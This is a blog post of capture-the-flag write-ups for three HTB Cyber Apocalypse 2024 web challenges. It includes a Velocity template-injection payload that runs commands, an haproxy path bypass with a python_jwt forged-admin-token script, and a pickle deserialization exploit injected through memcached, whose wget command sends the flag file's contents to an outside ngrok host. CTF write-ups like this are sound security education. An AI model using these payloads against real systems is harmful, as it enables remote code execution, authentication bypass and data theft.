---
title: Writeups for Web challenges from HTB Cyber Apocalypse CTF 2024
tags:
  - ctf
  - cyber-apocalypse
  - htb
  - htb-2024
  - web
categories:
  - CTF
  - Writeups
summary: This blog post contains the writeups for the web challenges that i solved from HTB Cyber Apocalypse 2024   
created: 2024-03-14
lastmod: 2024-03-14
image: https://github.com/hash3liZer/khatta/assets/29171692/d5abad92-0b61-4418-af4b-582a6d03044b
---

We just finished playing the HTB Cyber Apocalypse 2024. It was real fun. I wasn't able to mainly solve 2 of the hard challenges. Neverthless, it was real fun and just like every other time, got new things to learn. I mainly focused on web and tried one challenge from Misc which i wasn't able to solve. Anyhow, the writeups for some of the interesting web one's that i sovled. 

## WEB
### Labyrinth Linguist - Easy

I reviewed whole code. First thing i noticed is the use of `velocity` template engine in the application. Moreover, the version that was specified for usage was `1.7`:
```xml
<dependencies>
  <dependency>
    <groupId>org.springframework.boot</groupId>
    <artifactId>spring-boot-starter-web</artifactId>
  </dependency>
  <dependency>
    <groupId>org.apache.velocity</groupId>
    <artifactId>velocity</artifactId>
    <version>1.7</version>
  </dependency>
  <dependency>
    <groupId>org.apache.velocity</groupId>
    <artifactId>velocity</artifactId>
    <version>1.7</version>
  </dependency>
</dependencies>
```

The specified version was quite an outdated version of the library. Now, first thing i did was try to read the code and look for any SSTIs. 
```java
public static String readFileToString(String filePath, String replacement) throws IOException {
    StringBuilder content = new StringBuilder();
    BufferedReader bufferedReader = null;

    try {
        bufferedReader = new BufferedReader(new FileReader(filePath));
        String line;
        
        while ((line = bufferedReader.readLine()) != null) {
            line = line.replace("TEXT", replacement);
            content.append(line);
            content.append("\n");
        }
    } finally {
        if (bufferedReader != null) {
            try {
                bufferedReader.close();
            } catch (IOException e) {
                e.printStackTrace();
            }
        }
    }

    return content.toString();
}
```

So, we definitely are replacing the the word `TEXT` with the our input. And later on this code was processed here: 
```java
org.apache.velocity.Template t = new org.apache.velocity.Template();
t.setRuntimeServices(runtimeServices);
try {

  t.setData(runtimeServices.parse(reader, "home"));
  t.initDocument();
  VelocityContext context = new VelocityContext();
  context.put("name", "World");

  StringWriter writer = new StringWriter();
  t.merge(context, writer);
  template = writer.toString();

} catch (ParseException e) {
  e.printStackTrace();
}
```

At first i confirmed the injection by providing the `$name` value to the `text` parameter and it replaced it with `world`. Now, doing a bit of googling, i discovered a `CVE` for this specific version of `Velocity`.
I used the following payload with the name param
```
#set($e="e");$e.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec("whoami")
```

I used curl to execute the payload and got the right execution: 
```bash
curl.exe 'http://94.237.49.166:35229/' -X POST --data-raw 'text=%23set($e=%22e%22);$e.getClass().forName(%22java.lang.Runtime%22).getMethod(%22getRuntime%22,null).invoke(null,null).exec(%22whoami%22)'
```

However, i had a hard time getting the flag since i wasn't able to get a reverse shell or place some special characters in the command. This seemed like a dead end for a second. But then i fired up `sstimap` against it. 
And to my surprise i was able to get an OS Shell directly without having to do the CVE exploit: 
```
python3 sstimap.py --url http://94.237.49.166:35229/ -f --os-shell --engine velocity
```

Get the flag
```
cat /flag*
```

### LockTalk

It was a flask application with haproxy in front of the application. Reviewing the code, i found 3 APIs that i can request: 
```python
@api_blueprint.route('/get_ticket', methods=['GET'])
def get_ticket():

    claims = {
        "role": "guest", 
        "user": "guest_user"
    }
    
    token = jwt.generate_jwt(claims, current_app.config.get('JWT_SECRET_KEY'), 'PS256', datetime.timedelta(minutes=60))
    return jsonify({'ticket: ': token})


@api_blueprint.route('/chat/<int:chat_id>', methods=['GET'])
@authorize_roles(['guest', 'administrator'])
def chat(chat_id):
  ...

@api_blueprint.route('/flag', methods=['GET'])
@authorize_roles(['administrator'])
def flag():
    return jsonify({'message': current_app.config.get('FLAG')}), 200
```

The goal here is to generate a ticket and somehow modify the claim so that the role we use is of administrator. However, we can't simply request the `/get_ticket` api because of `haproxy`: 
```conf
global
    daemon
    maxconn 256

defaults
    mode http

    timeout connect 5000ms
    timeout client 50000ms
    timeout server 50000ms

frontend haproxy
    bind 0.0.0.0:1337
    default_backend backend

    http-request deny if { path_beg,url_dec -i /api/v1/get_ticket }
    
backend backend
    balance roundrobin
    server s1 0.0.0.0:5000 maxconn 32 check
```

I bypassed the filter rule with the simple listing: 
```
curl http://localhost:1337/../api/v1/get_ticket -i --path-as-is
```

The above returned me with the `JWT` token needed. 
```
eyJhbGciOiJQUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3MTAxNDc1MTksImlhdCI6MTcxMDE0MzkxOSwianRpIjoiYmQtcW5GYnBqcUhpbEFSeXN5aGwyUSIsIm5iZiI6MTcxMDE0MzkxOSwicm9sZSI6Imd1ZXN0IiwidXNlciI6Imd1ZXN0X3VzZXIifQ.s569WtLjeq3NQSI9GXVDfTYJSUrxdEGtCBnxjHnwEa6UWwS6RNfLF-qMjvAc-GiqHzG1Wx1SQd1tsqIqnIF6zz9zXFQaSimFgnYE0HvUwaI_XhzBJA-ZxmrgetgJjbOhKBOopKIXmtUt-LPE2tsB3yr6SJe-C2RvFlTzrgQMDrOtRBJJiXfYne1QI4nnXUFY0XsNXCpKQIe6ELHNmeE-F6Fj5s1AJwUEBwWJNVnmw_s5mVbL1hvIE54e2mJg5VK8PfCLXx4u-ghVRgGDRkUza4UpgM8nrSmTj5d40iREyz9M6PDvi0TFhuVvlQStrpz0UId-uyL4-Vwp9UnTOSNBRA
```

Now, checking the requirements of project, i found `python_jwt==3.3.3`:
```
uwsgi
Flask
requests
python_jwt==3.3.3
```

Heading to google, i found a security advisory of the project on Github: https://github.com/davedoesdev/python-jwt/security/advisories/GHSA-5p8v-58qm-c7fp

It seems as if i can modify the claims of the JWT for versions `<3.3.4`

![image](https://github.com/hash3liZer/khatta/assets/29171692/758bd543-0d9a-4543-a1a1-7d7f43cb4fb8)

In one of the commits of the repo of fixing this issue i found a code that i the modified to write my own exploit. Make sure to replace the token in the `create` method:
```python
from datetime import timedelta
from json import loads, dumps
import python_jwt as jwt
from pyvows import Vows, expect
from jwcrypto.common import base64url_decode, base64url_encode
from pprint import pprint

class ForgedClaims:
    def create(self):
        """ Generate token """
        # payload = {'sub': 'alice'}
        token = "eyJhbGciOiJQUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3MTAxNDc1MTksImlhdCI6MTcxMDE0MzkxOSwianRpIjoiYmQtcW5GYnBqcUhpbEFSeXN5aGwyUSIsIm5iZiI6MTcxMDE0MzkxOSwicm9sZSI6Imd1ZXN0IiwidXNlciI6Imd1ZXN0X3VzZXIifQ.s569WtLjeq3NQSI9GXVDfTYJSUrxdEGtCBnxjHnwEa6UWwS6RNfLF-qMjvAc-GiqHzG1Wx1SQd1tsqIqnIF6zz9zXFQaSimFgnYE0HvUwaI_XhzBJA-ZxmrgetgJjbOhKBOopKIXmtUt-LPE2tsB3yr6SJe-C2RvFlTzrgQMDrOtRBJJiXfYne1QI4nnXUFY0XsNXCpKQIe6ELHNmeE-F6Fj5s1AJwUEBwWJNVnmw_s5mVbL1hvIE54e2mJg5VK8PfCLXx4u-ghVRgGDRkUza4UpgM8nrSmTj5d40iREyz9M6PDvi0TFhuVvlQStrpz0UId-uyL4-Vwp9UnTOSNBRA"
        return token

    def topic(self, topic):
        """ Use mix of JSON and compact format to insert forged claims including long expiration """
        [header, payload, signature] = topic.split('.')
        parsed_payload = loads(base64url_decode(payload))
        print(parsed_payload)
        parsed_payload['role'] = 'administrator'
        parsed_payload['user'] = 'admin_user'
        print(parsed_payload)
        # parsed_payload['exp'] = 2000000000
        fake_payload = base64url_encode((dumps(parsed_payload, separators=(',', ':'))))
        return '{"  ' + header + '.' + fake_payload + '.":"","protected":"' + header + '", "payload":"' + payload + '","signature":"' + signature + '"}'

claime__ = ForgedClaims()
jwt = claime__.create()
print(claime__.topic(jwt))
```

I ran the code and got the following payload: 
```
{"  eyJhbGciOiJQUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3MTAxNDc1MTksImlhdCI6MTcxMDE0MzkxOSwianRpIjoiYmQtcW5GYnBqcUhpbEFSeXN5aGwyUSIsIm5iZiI6MTcxMDE0MzkxOSwicm9sZSI6ImFkbWluaXN0cmF0b3IiLCJ1c2VyIjoiYWRtaW5fdXNlciJ9.":"","protected":"eyJhbGciOiJQUzI1NiIsInR5cCI6IkpXVCJ9", "payload":"eyJleHAiOjE3MTAxNDc1MTksImlhdCI6MTcxMDE0MzkxOSwianRpIjoiYmQtcW5GYnBqcUhpbEFSeXN5aGwyUSIsIm5iZiI6MTcxMDE0MzkxOSwicm9sZSI6Imd1ZXN0IiwidXNlciI6Imd1ZXN0X3VzZXIifQ","signature":"s569WtLjeq3NQSI9GXVDfTYJSUrxdEGtCBnxjHnwEa6UWwS6RNfLF-qMjvAc-GiqHzG1Wx1SQd1tsqIqnIF6zz9zXFQaSimFgnYE0HvUwaI_XhzBJA-ZxmrgetgJjbOhKBOopKIXmtUt-LPE2tsB3yr6SJe-C2RvFlTzrgQMDrOtRBJJiXfYne1QI4nnXUFY0XsNXCpKQIe6ELHNmeE-F6Fj5s1AJwUEBwWJNVnmw_s5mVbL1hvIE54e2mJg5VK8PfCLXx4u-ghVRgGDRkUza4UpgM8nrSmTj5d40iREyz9M6PDvi0TFhuVvlQStrpz0UId-uyL4-Vwp9UnTOSNBRA"}
```

Note that we need to place the payload as it is as our new JWT token to make it work:
```bash
curl -i "http://94.237.60.112:35242/api/v1/flag" -H 'Authorization: {"  eyJhbGciOiJQUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3MTAxNDc1MTksImlhdCI6MTcxMDE0MzkxOSwianRpIjoiYmQtcW5GYnBqcUhpbEFSeXN5aGwyUSIsIm5iZiI6MTcxMDE0MzkxOSwicm9sZSI6ImFkbWluaXN0cmF0b3IiLCJ1c2VyIjoiYWRtaW5fdXNlciJ9.":"","protected":"eyJhbGciOiJQUzI1NiIsInR5cCI6IkpXVCJ9", "payload":"eyJleHAiOjE3MTAxNDc1MTksImlhdCI6MTcxMDE0MzkxOSwianRpIjoiYmQtcW5GYnBqcUhpbEFSeXN5aGwyUSIsIm5iZiI6MTcxMDE0MzkxOSwicm9sZSI6Imd1ZXN0IiwidXNlciI6Imd1ZXN0X3VzZXIifQ","signature":"s569WtLjeq3NQSI9GXVDfTYJSUrxdEGtCBnxjHnwEa6UWwS6RNfLF-qMjvAc-GiqHzG1Wx1SQd1tsqIqnIF6zz9zXFQaSimFgnYE0HvUwaI_XhzBJA-ZxmrgetgJjbOhKBOopKIXmtUt-LPE2tsB3yr6SJe-C2RvFlTzrgQMDrOtRBJJiXfYne1QI4nnXUFY0XsNXCpKQIe6ELHNmeE-F6Fj5s1AJwUEBwWJNVnmw_s5mVbL1hvIE54e2mJg5VK8PfCLXx4u-ghVRgGDRkUza4UpgM8nrSmTj5d40iREyz9M6PDvi0TFhuVvlQStrpz0UId-uyL4-Vwp9UnTOSNBRA"}'
```

And got the flag:
```
HTB{h4Pr0Xy_n3v3r_D1s@pp01n4s}
```

### SerialFlow
Analyzing the code of the application, i got that application is using the library `flask-session` with `pylibmc` to store sessions in memcached. 
```python
import pylibmc, uuid, sys
from flask import Flask, session, request, redirect, render_template
from flask_session import Session

app = Flask(__name__)

app.secret_key = uuid.uuid4()

app.config["SESSION_TYPE"] = "memcached"
app.config["SESSION_MEMCACHED"] = pylibmc.Client(["127.0.0.1:11211"])
app.config.from_object(__name__)

Session(app)
```

At this point, i thougt it would be a plain memcached injection but nothing. Doing a bit of google i found various articles on memcached injection with other libraries from Python. However, i found this one blog on `pylibmc` exploitation: https://btlfry.gitlab.io/notes/posts/memcached-command-injections-at-pylibmc/

Reading the blog, i got that we can do a memcached injection with `pylibmc` by using carriage return line breaks by encoding the payload in a special sequence that is being understood by the HTTP protocol. However, the tricky part for me was to identify where to place the payload. In the blog, the author used a cookie named `notsecret` which i wasn't sure of. After spending some more time on this, i found the author's twitter where he attached a GIF of the exploit and used it as the session cookie. 

The good thing was we got the exploit code from the blog. I modified it a bit to send request to my `ngrok` server:
```python
import pickle
import os

class RCE:
    def __reduce__(self):
        cmd = ('wget https://b058-2407-d000-403-e00e-60d2-910d-df7c-df4d.ngrok-free.app')
        return os.system, (cmd,)

def generate_exploit():
    payload = pickle.dumps(RCE(), 0)
    payload_size = len(payload)
    cookie = b'137\r\nset BT_:1337 0 2592000 '
    cookie += str.encode(str(payload_size))
    cookie += str.encode('\r\n')
    cookie += payload
    cookie += str.encode('\r\n')
    cookie += str.encode('get BT_:1337')

    pack = ''
    for x in list(cookie):
        if x > 64:
            pack += oct(x).replace("0o","\\")
        elif x < 8:
            pack += oct(x).replace("0o","\\00")
        else:
            pack += oct(x).replace("0o","\\0")

    return f"\"{pack}\""

if __name__ == "__main__":
    print(generate_exploit())
```

The payload i got looked something like this: 
```
"\061\063\067\015\012\163\145\164\040\102\124\137\072\061\063\063\067\040\060\040\062\065\071\062\060\060\060\040\061\060\060\015\012\143\156\164\012\163\171\163\164\145\155\012\160\060\012\050\126\167\147\145\164\040\150\164\164\160\163\072\057\057\142\060\065\070\055\062\064\060\067\055\144\060\060\060\055\064\060\063\055\145\060\060\145\055\066\060\144\062\055\071\061\060\144\055\144\146\067\143\055\144\146\064\144\056\156\147\162\157\153\055\146\162\145\145\056\141\160\160\012\160\061\012\164\160\062\012\122\160\063\012\056\015\012\147\145\164\040\102\124\137\072\061\063\063\067"
```

As per the HTTP specs, we need send it with double quotes as the session cookie. I used burp: 
```
GET /set?uicolor=green HTTP/1.1
Host: 83.136.252.32:47034
sec-ch-ua: "Not_A Brand";v="8", "Chromium";v="120"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Windows"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.216 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Cookie: session="\061\063\067\015\012\163\145\164\040\102\124\137\072\061\063\063\067\040\060\040\062\065\071\062\060\060\060\040\061\062\070\015\012\143\160\157\163\151\170\012\163\171\163\164\145\155\012\160\060\012\050\126\167\147\145\164\040\042\150\164\164\160\163\072\057\057\062\143\065\062\055\062\064\060\067\055\144\060\060\060\055\064\060\063\055\145\060\060\145\055\066\060\144\062\055\071\061\060\144\055\144\146\067\143\055\144\146\064\144\056\156\147\162\157\153\055\146\162\145\145\056\141\160\160\057\163\157\155\145\164\150\151\156\147\044\050\143\141\164\040\057\146\154\141\147\052\051\042\012\160\061\012\164\160\062\012\122\160\063\012\056\015\012\147\145\164\040\102\124\137\072\061\063\063\067"; token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Imhhc2hpc2giLCJzdWJzY3JpcHRpb24iOiJndWVzdCIsImlhdCI6MTcwNTE5MTQ3OSwiZXhwIjoxNzA1Mjc3ODc5fQ.thx2tlcE92NDlzrVXEzXtpBD1wezF6_-w2Yem60vrUM; 
Connection: close
```

At first it returned me a `200` response. While i should have gotten an `Internal Server Error`. Running it a couple times, returned me a request on my `ngrok` terminal:
![image](https://github.com/hash3liZer/khatta/assets/29171692/5df209cf-3e5f-4a0a-ae0b-45bc7657993c)

So, i modified the exploit a bit to get the flag: 
```python
class RCE:
    def __reduce__(self):
        cmd = ('wget "https://2c52-2407-d000-403-e00e-60d2-910d-df7c-df4d.ngrok-free.app/something$(cat /flag*)"')
        return os.system, (cmd,)
```

I sent the request second and got the response on terminal: 
```
# python -m http.server 8080
Serving HTTP on :: port 8080 (http://[::]:8080/) ...
::1 - - [12/Mar/2024 22:06:38] code 404, message File not found
::1 - - [12/Mar/2024 22:06:38] "GET /somethingHTB%7By0u_th0ught_th15_wou1d_b3_s1mpl3?} HTTP/1.1" 404 -
```

## Ending Note
Overall, it was really fun playing the CTF and just like any other time, i got new things to learn :)
